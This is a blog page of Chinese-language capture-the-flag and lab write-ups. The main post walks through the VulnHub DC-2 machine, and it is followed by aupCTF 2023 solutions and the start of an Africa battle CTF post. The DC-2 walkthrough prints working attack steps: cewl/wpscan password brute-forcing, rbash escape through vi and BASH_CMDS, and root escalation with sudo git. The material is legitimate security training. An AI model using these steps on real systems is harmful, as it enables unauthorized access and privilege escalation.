<p><img src="https://img-blog.csdnimg.cn/95dfa9dfc043429a91753966aae7dffa.png" alt="2"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#GC%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%AE%9E%E9%99%85%E8%BF%90%E7%94%A8">参考链接1</a></p>
<p><a target="_blank" rel="noopener" href="http://xilzy666.gitee.io/xilzy/2022/03/05/nss-prize1-2/">参考链接2</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/123520193?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">参考链接3</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/features.gc.php">参考链接4</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53460654/article/details/121889104?ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNDYwNjU0L2FydGljbGUvZGV0YWlscy8xMjE4ODkxMDQ=">参考链接5</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/127598455?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">参考链接6</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-DC-2打靶笔记"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/"
    >DC-2打靶笔记</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/" class="article-date">
  <time datetime="2023-07-09T13:56:10.000Z" itemprop="datePublished">2023-07-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="靶机安装以及配置"><a href="#靶机安装以及配置" class="headerlink" title="靶机安装以及配置"></a>靶机安装以及配置</h2><p>准备：</p>
<blockquote>
<p>kali虚拟机<br>dc-2靶机<br>windows11(可用可不用)</p>
</blockquote>
<p>靶场下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a><br>下载好后用VM打开，设置为NAT模式<br><img src="https://img-blog.csdnimg.cn/3a2cf2a875e2404a8b5653dde6445ccc.png" alt="1"></p>
<p>开机</p>
<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p><strong>探测主机存活</strong><br>使用工具nmap：<code>nmap 192.168.206.136/24</code><br>检测到dc-2靶机地址为192.168.206.136<br><img src="https://img-blog.csdnimg.cn/4a9b341fd14d4e7587ad30fc6bbbf3fb.png" alt="2"><br><strong>深度探测靶机信息</strong></p>
<p><code>nmap -sV -p- 192.168.206.136</code></p>
<blockquote>
<p>-sV:端口扫描并获取服务版本信息<br>-p-:全端口扫描 </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9129aeec46a7400e91881908ff120fa4.png" alt="3"><br>登陆网站192.168.206.136<br>登陆网站时会发生一些问题显示<code>Did not follow redirect to http://dc-2/</code>，意思就是没有重定向到<a target="_blank" rel="noopener" href="http://dc-2/%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E6%89%93%E9%9D%B6%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%9A%84%EF%BC%8C%E5%90%8C%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8kali%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9C%80%E8%A6%81%E5%B0%86kali%E7%9A%84hosts%E6%96%87%E4%BB%B6%EF%BC%88/etc/hosts%EF%BC%89%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%8B%E6%9C%AC%E5%9C%B0DNS%E8%A7%A3%E6%9E%90%E3%80%82">http://dc-2/，由于我打靶的时候使用本机进行的，同时会使用kali上的一些工具，那么需要将kali的hosts文件（/etc/hosts）添加一下本地DNS解析。</a></p>
<p><img src="https://img-blog.csdnimg.cn/af1bd1db85754fda8912593927733dcf.png" alt="3"><br><strong>windows</strong>host文件在<code>&quot;C:\Windows\System32\drivers\etc\hosts&quot;</code>，添加完之后即可正常进行。<br>打开网站后查看网站整体框架，可以使用kali中的工具<code>whatweb</code>，或者浏览器插件<br><img src="https://img-blog.csdnimg.cn/03fd35a8fd4948e890abcd0db30f9bf3.png" alt="2"><br>可以知道网站是wordpress<br>拿到flag1<br><img src="https://img-blog.csdnimg.cn/0fc407bd818c4d52a034bf10a1cefb37.png" alt="6"></p>
<blockquote>
<p>标志 1：<br>你常用的单词表可能不起作用，所以，也许你只需要 cewl 即可。<br>密码越多越好，但有时您无法赢得所有密码。<br>以一个身份登录即可查看下一个标志。<br>如果找不到，请以其他身份登录。</p>
</blockquote>
<p>查看一下cewl是什么</p>
<blockquote>
<p>cewl 是一个用于生成自定义字典（custom wordlist）的工具，它是根据目标网站或文本中提取的单词和短语创建字典的一种方式。<br>cewl 的全称是 “Custom Word List generator”，它是一个基于Ruby编写的命令行工具。它的主要功能是分析指定的文本或通过爬取目标网站提取出的单词，并根据提取的内容生成一个定制的字典。<br>这个工具在渗透测试和安全评估中经常用于密码破解、暴力攻击和社交工程等方面。通过生成针对特定目标的字典，攻击者可以尝试使用常见的、有可能与目标相关的单词和短语进行密码破解或攻击。<br>cewl 可以根据不同的选项和参数来调整字典的生成过程，例如排除特定的单词、设置最小和最大长度限制、指定输出文件等。</p>
</blockquote>
<p>那意思已经很清楚了，就让我们登录进去，先用cewl制作密码字典<br><code>cewl url -w 文件名</code>即可生成一个字典，后面你可以使用wpscan进行用户名猜解和密码爆破，后续就不演示了，最后可知存在用户<strong>admin，jerry，tom</strong>密码就使用cewl跑出来的密码。最后可以找出jerry和tom的密码，后面登陆jerry用户后可以得到flag2<br><img src="https://img-blog.csdnimg.cn/3381eac70aea4ae0841ad1cec1a30318.png" alt="2"></p>
<blockquote>
<p>如果你无法利用 WordPress 并走捷径，还有另一种方法。<br>希望您找到另一个切入点。</p>
</blockquote>
<p>在这里想到刚才探测端口的时候存在ssh，但是端口改到了7744，使用ssh登陆一下。<br>直接写知识点吧，肝一天了。。。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>这个时候使用nmap进行探测</p>
<blockquote>
<p>nmap -A -p- 192.168.206.136 全端口探测，还有端口服务以及详细配置</p>
</blockquote>
<h3 id="本地DNS设置"><a href="#本地DNS设置" class="headerlink" title="本地DNS设置"></a>本地DNS设置</h3><p><strong>hosts文件地址</strong><br>windows：”C:\Windows\System32\drivers\etc\hosts”<br>linux：&#x2F;etc&#x2F;hosts</p>
<h3 id="cewl工具的使用"><a href="#cewl工具的使用" class="headerlink" title="cewl工具的使用"></a>cewl工具的使用</h3><p>cewl 是一个用于生成自定义字典（custom wordlist）的工具，它是根据目标网站或文本中提取的单词和短语创建字典的一种方式。</p>
<p>cewl 的全称是 “Custom Word List generator”，它是一个基于Ruby编写的命令行工具。它的主要功能是分析指定的文本或通过爬取目标网站提取出的单词，并根据提取的内容生成一个定制的字典。</p>
<p>这个工具在渗透测试和安全评估中经常用于密码破解、暴力攻击和社交工程等方面。通过生成针对特定目标的字典，攻击者可以尝试使用常见的、有可能与目标相关的单词和短语进行密码破解或攻击。</p>
<p>cewl 可以根据不同的选项和参数来调整字典的生成过程，例如排除特定的单词、设置最小和最大长度限制、指定输出文件等。<br>基础命令：<code>cewl url -w 文件名</code>这样之后会生成一个有关该网站的字典，便于后面爆破密码使用。<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>这个tom用户可以登录，jerry登陆不了，密码就是爆破出来的。</p>
<h3 id="rbash逃逸-提权的一种"><a href="#rbash逃逸-提权的一种" class="headerlink" title="rbash逃逸(提权的一种)"></a>rbash逃逸(提权的一种)</h3><p>rbash：就是受限的bash（bash，一个命令行解释器，接受用户输入的指令并且执行相应的命令），一些命令不能使用<br>以下情况是不允许rbash执行的</p>
<blockquote>
<p>使用命令cd更改目录<br>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）<br>指定包含参数’&#x2F;‘的文件名<br>指定包含参数’ - ‘的文件名<br>使用重定向输出’&gt;’, ‘&gt;&gt;’, ‘&gt; |’, ‘&lt;&gt;’ ‘&gt;&amp;’,’&amp;&gt;’</p>
</blockquote>
<p>大致的限制如上<br>因此本靶场用到rbash逃逸，由于测试后发现vi命令可以使用，因此使用vi设置shell。<br>进入vi界面</p>
<blockquote>
<p>vi</p>
<p>然后按Esc键，输入<br>:set shell&#x3D;&#x2F;bin&#x2F;bash</p>
</blockquote>
<p>设置好shell并回车，接着输入 </p>
<blockquote>
<p>:shell</p>
<p>回车，启动shell<br>之后退出vi编辑器，查看权限。结果这个靶机没有成功，正常是已经可以了，由于这个靶机的环境变量的问题，在这里我们使用命令添加环境变量<br><code>export PATH=$PATH:/bin/</code><br>这条命令将把 &#x2F;bin&#x2F; 目录添加到当前 PATH 环境变量中。<br>环境变量 PATH 指定了操作系统在查找可执行文件时要搜索的目录列表。通过将一个目录路径添加到 PATH 中，你可以使系统在该目录中查找可执行文件。<br>具体而言，export PATH&#x3D;$PATH:&#x2F;bin&#x2F; 这条命令的含义是：<br>$PATH 表示当前已经设置的 PATH 变量的值。它将被展开为当前的 PATH 路径。<br>&#x2F;bin&#x2F; 是要添加到 PATH 中的目录路径。<br>通过执行这个命令，你将把 &#x2F;bin&#x2F; 目录添加到当前的 PATH 变量中，使得系统能够在 &#x2F;bin&#x2F; 目录中查找可执行文件。这样，在你执行命令时，系统将会在原有的 PATH 路径中搜索命令，同时也会在 &#x2F;bin&#x2F; 目录中搜索命令。<br>这种方式可以方便地执行位于 &#x2F;bin&#x2F; 目录下的命令，而无需指定完整的路径。需要注意的是，在使用 export 命令设置环境变量时，只会在当前会话中生效。如果希望在每次登录时自动设置 PATH，可以将该命令添加到启动文件（如 .bashrc 或 .bash_profile）中。</p>
</blockquote>
<p><code>export PATH=$PATH:/usr/bin/</code></p>
<blockquote>
<p>这条命令将把 &#x2F;usr&#x2F;bin&#x2F; 目录添加到当前 PATH 环境变量中。<br>环境变量 PATH 指定了操作系统在查找可执行文件时要搜索的目录列表。通过将一个目录路径添加到 PATH 中，你可以使系统在该目录中查找可执行文件。<br>具体而言，export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin&#x2F; 这条命令的含义是：<br>$PATH 表示当前已经设置的 PATH 变量的值。它将被展开为当前的 PATH 路径。<br>&#x2F;usr&#x2F;bin&#x2F; 是要添加到 PATH 中的目录路径。<br>通过执行这个命令，你将把 &#x2F;usr&#x2F;bin&#x2F; 目录添加到当前的 PATH 变量中，使得系统能够在 &#x2F;usr&#x2F;bin&#x2F; 目录中查找可执行文件。这样，在你执行命令时，系统将会在原有的 PATH 路径中搜索命令，同时也会在 &#x2F;usr&#x2F;bin&#x2F; 目录中搜索命令。<br>这种方式可以方便地执行位于 &#x2F;usr&#x2F;bin&#x2F; 目录下的命令，而无需指定完整的路径。需要注意的是，在使用 export 命令设置环境变量时，只会在当前会话中生效。如果希望在每次登录时自动设置 PATH，可以将该命令添加到启动文件（如 .bashrc 或 .bash_profile）中。</p>
</blockquote>
<h3 id="BASH-CMDS设置shell"><a href="#BASH-CMDS设置shell" class="headerlink" title="BASH_CMDS设置shell"></a>BASH_CMDS设置shell</h3><p>BASH_CMDS 是一个包含 Bash 命令的关联数组（associative array）环境变量。它在 Bash 中用于存储和管理命令的定义和别名。当你在 Bash 中定义一个函数、别名或关键字时，它会被添加到 BASH_CMDS 环境变量中。BASH_CMDS 是一个关联数组，它以命令名作为索引，对应的值则是命令的定义。</p>
<p><code>BASH_CMDS[x]=/bin/bash</code>这个命令是在BASH_CMDS数组中将索引x关联到&#x2F;bin&#x2F;bash的命令，意思就是执行<strong>a</strong>命令时也就是执行了**&#x2F;bin&#x2F;bash**命令。<br>与上面两条命令配合之后就可以实现rbash逃逸。(可以执行被限制的命令了)<br><img src="https://img-blog.csdnimg.cn/f1b84162e4bd44f3af7d24217ca12ca0.png" alt="2"></p>
<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>前面实现<strong>rbash逃逸</strong>后打开flag文件提示jerry用户，我们切换到jerry用户（密码就是之前爆破出来的密码），打开jerry用户下的flag得到提示需要git提权。<br>git提权的前提是在使用命令<code>sudo -l</code>之后没有密码验证。<br><img src="https://img-blog.csdnimg.cn/151e0426bdce4e17b9045110b9e3dc0d.png" alt="1"><br><strong>第一种</strong></p>
<blockquote>
<p>sudo git help config</p>
</blockquote>
<p>回车然后输入</p>
<blockquote>
<p>!&#x2F;bin&#x2F;bash  (这里bash也可以换成sh)</p>
</blockquote>
<p><strong>第二种</strong></p>
<blockquote>
<p>sudo git -p help</p>
</blockquote>
<p>回车输入</p>
<blockquote>
<p>!&#x2F;bin&#x2F;bash  (这里bash也可以换成sh)</p>
</blockquote>
<p>已经成为root权限</p>
<h2 id="命令学习"><a href="#命令学习" class="headerlink" title="命令学习"></a>命令学习</h2><p>环境变量查看（查看可执行命令）</p>
<blockquote>
<p>echo $PATH<br>比如说得到**&#x2F;home&#x2F;jerry&#x2F;bin**，后面使用<code>echo /home/jerry/bin/*</code>查看可执行的命令</p>
</blockquote>
<p>添加环境变量</p>
<blockquote>
<p>export PATH&#x3D;$PATH:路径<br>常用路径变量&#x2F;usr&#x2F;bin和&#x2F;bin&#x2F;</p>
</blockquote>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DC/" rel="tag">DC</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-aupCTF-2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/26/aupCTF-2023/"
    >aupCTF 2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/26/aupCTF-2023/" class="article-date">
  <time datetime="2023-06-26T14:49:27.000Z" itemprop="datePublished">2023-06-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E8%B5%9B%E4%BA%8BWP/">赛事WP</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient-Cipher"><a href="#Ancient-Cipher" class="headerlink" title="Ancient Cipher"></a>Ancient Cipher</h3><p><img src="https://img-blog.csdnimg.cn/5df595f659f94c7ab5d801f037dc2a2d.png" alt="1"><br>先放随波逐流里看看，得到flag，是凯撒位移17位<br><img src="https://img-blog.csdnimg.cn/ba3e1de862294304a5b0ef7baddfaf6b.png" alt="2"></p>
<h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="https://img-blog.csdnimg.cn/0f0569b9766b44a786367768f6b9e46e.png" alt="3"><br>这个密码第一次见，查了一下是恩尼格码机，使用网站<a target="_blank" rel="noopener" href="https://www.dcode.fr/chiffre-machine-enigma">dcode.fr</a>解密<br><img src="https://img-blog.csdnimg.cn/e8e5f10487bf4d5b9c058283305c173b.png" alt="3">得到flag。</p>
<h3 id="Swiss-Army-Knife"><a href="#Swiss-Army-Knife" class="headerlink" title="Swiss Army Knife"></a>Swiss Army Knife</h3><p>点开文件后是由XY组成的字符<br><img src="https://img-blog.csdnimg.cn/5c8faeb486e642c7bb99a4da46ec88f0.png" alt="1">这让我想到了二进制0和1。将X替换为0，Y替换为1<br><code>01001100 01010011 00110000 01110100 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001100 01101001 01000001 01110101 01001100 01101001 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01010011 01000001 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110000 01110100 01001100 01010011 01000001 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 00110100 01100111 01001100 01101001 00110000 01110100 01001001 01000011 00110000 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110101 01001100 01101001 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01010011 00110000 01110101 01001100 01010011 01000001 01110100 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01010011 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110000 01110100 01001001 01000011 00110000 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110101 01001100 01101001 01000001 01110100 01001100 01101001 00110000 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010001 00111101 00111101</code><br>然后二进制转ascii码<br><img src="https://img-blog.csdnimg.cn/5cd8d3aaff6c474eb06754a05281c615.png" alt="1">得到base64编码的密文，再进行解密得到摩斯密码<br><img src="https://img-blog.csdnimg.cn/59f1604b00e046fab59fc63703de08cb.png" alt="1">在进行摩斯密码解密后又得到base系列的密文<br><img src="https://img-blog.csdnimg.cn/9840a4da1a1b450482459d1139feb27e.png" alt="2">继续解密<br><img src="https://img-blog.csdnimg.cn/8ea27925a3a54fb6b5b99e177b2351c9.png" alt="1">最后再进行一次凯撒解密，key&#x3D;19，得到flag。<strong>aupCTF{mu1tip13-3nc0d1ng5-u53d}</strong></p>
<h3 id="Battista’s-Bet"><a href="#Battista’s-Bet" class="headerlink" title="Battista’s Bet"></a>Battista’s Bet</h3><p><strong>我的朋友是意大利著名密码学家Giovan Battista Bellaso的忠实粉丝，他向我挑战破解这个密文。我一直在努力解码它，你能帮我吗 **<br>查找这个密码学家发明的密码<br><img src="https://img-blog.csdnimg.cn/9edf442d5cd04e6bb10dbff65252c89d.png" alt="1">打开<a target="_blank" rel="noopener" href="https://www.dcode.fr/chiffre-autoclave">网站</a>解密<br>这里需要一个密钥，查看提示发现密钥为</strong>SECRET**<br><img src="https://img-blog.csdnimg.cn/d4ffb92d6b4c42fd9b8a0579ca441991.png" alt="2">得到flag。<br><img src="https://img-blog.csdnimg.cn/9b847c749a684ba4a8d84d6f6d5ca062.png" alt="2"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Starter"><a href="#Starter" class="headerlink" title="Starter"></a>Starter</h3><p>打开网站后如下界面<br><img src="https://img-blog.csdnimg.cn/d2498d0fc13b422cb81eec69d0c87a2f.png" alt="6">查看源码得到flag。<strong>aupCTF{w45n’t-th47-h4rd-r1gh7}</strong><br><img src="https://img-blog.csdnimg.cn/2af8c9822abb47fda91d26bd8b464b41.png" alt="7"></p>
<h3 id="SQLi-1"><a href="#SQLi-1" class="headerlink" title="SQLi - 1"></a>SQLi - 1</h3><p><img src="https://img-blog.csdnimg.cn/12c88ff0993c4feaaaa5b118f669d684.png" alt="7">得到flag。<br><img src="https://img-blog.csdnimg.cn/e3d70cf1983240e3b7bc7e5b007b3329.png" alt="2"></p>
<h3 id="SQLi-2"><a href="#SQLi-2" class="headerlink" title="SQLi - 2"></a>SQLi - 2</h3><p>方法同SQLi - 1</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>给出源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">headar_easy</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>META<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'HTTP_GETFLAG'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>
        context <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token string">'[REDACTED]'</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        
        <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/flag.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>意思就是如果header头里有GETFLAG，并且值为yes即可得出flag。<strong>aupCTF{cust0m-he4d3r-r3qu3st}</strong><br><img src="https://img-blog.csdnimg.cn/fb98935d0ddd4199911500d3d259d82c.png" alt="1"></p>
<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p><img src="https://img-blog.csdnimg.cn/0f027c28c6fe4a7eb1179daeaa99dbf0.png" alt="2"><br>打开网站后<br><img src="https://img-blog.csdnimg.cn/453d33679d7c4d86969f177b9a73147d.png" alt="3">随便点进一个看看<br><img src="https://img-blog.csdnimg.cn/6cdfe7300f214c7a8003a3312c65f3c2.png" alt="2"><br>题目意思就是爆破page，果不其然，发现712为flag。<br><img src="https://img-blog.csdnimg.cn/552adc4ecd794ed982cb5681c503668d.png" alt="3"></p>
<h2 id="Stegnography"><a href="#Stegnography" class="headerlink" title="Stegnography"></a>Stegnography</h2><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>看题目就知道是LSB隐写。<br><img src="https://img-blog.csdnimg.cn/2253e5d2e4b74e7fb2dd531267e47149.png" alt="6"><br>拿到flag：<strong>aupCTF{zst1g-1s-c00l_rig3ht}</strong></p>
<h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>给出两个模糊图片，进行异或处理。<br>使用工具<strong>Stegsolve.jar</strong><br>先选择一张图片，然后在与另一张图片结合<br><img src="https://img-blog.csdnimg.cn/5d3f882cc578437d83836eff62d22738.png" alt="1"><br>之后得到图片<br><img src="https://img-blog.csdnimg.cn/3dc9c71a6ece4deba4cd1dd49a996a8f.png" alt="2"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h3><p>JSFUCK解密<br><img src="https://img-blog.csdnimg.cn/38a4f300723c41f48d5f83d2564b51cc.png" alt="1"><br>放控制台里运行就可以得到flag。<br><img src="https://img-blog.csdnimg.cn/a31ef56efa794b0ab298c69e29f3ff6b.png" alt="1"><br><strong>aupCTF{j4v45c1pt_but_f*ck3d}</strong></p>
<h3 id="Sanity-check"><a href="#Sanity-check" class="headerlink" title="Sanity check"></a>Sanity check</h3><p><img src="https://img-blog.csdnimg.cn/f5113653227342e7b872c62864e5621d.png" alt="1">就是一道签到题，flag在规则里说明了<br><img src="https://img-blog.csdnimg.cn/e26f24dd654b4460a14a9e1dcea4e2a5.png" alt="2"></p>
<h3 id="Frequency"><a href="#Frequency" class="headerlink" title="Frequency"></a>Frequency</h3><p><img src="https://img-blog.csdnimg.cn/cce4e02a75d24f24a43a7ac3a6ac9cfc.png" alt="1">下载音频文件后听到按键的声音，看来是<strong>DTMF拨号音识别</strong>有一个类似的题<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42939527/article/details/105201926">【WUST-CTF2020】girlfriend</a><br>使用工具<strong>dtmf2num_2</strong>得到按键号码<br><img src="https://img-blog.csdnimg.cn/5c1938e626414009aa94897eee698429.png" alt="3"><br>拿到flag。<strong>aupCTF{00923456060484}</strong></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3> 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-Africa-battle-CTF-2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/24/Africa-battle-CTF-2023/"
    >Africa battle CTF 2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/24/Africa-battle-CTF-2023/" class="article-date">
  <time datetime="2023-06-24T11:15:07.000Z" itemprop="datePublished">2023-06-24</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E8%B5%9B%E4%BA%8BWP/">赛事WP</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天国内没有什么比赛，看一下国外的比赛吧<br><img src="https://img1.imgtp.com/2023/06/24/1vay1LoH.png" alt="1"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>一开始做web题的时候环境一直打不开，我还以为是那边的问题，结果下午换了机场又能访问了。</p>
<h3 id="Civilization"><a href="#Civilization" class="headerlink" title="Civilization"></a>Civilization</h3><p>打开网站后看到这个<br><img src="https://img-blog.csdnimg.cn/1197576aa444402bbeccc85df9ccafcd.png" alt="2"><br>打开网站后看到这个<br>传入source后显示源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$cigar</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'africacradlecivilization'</span><span class="token punctuation">;</span>
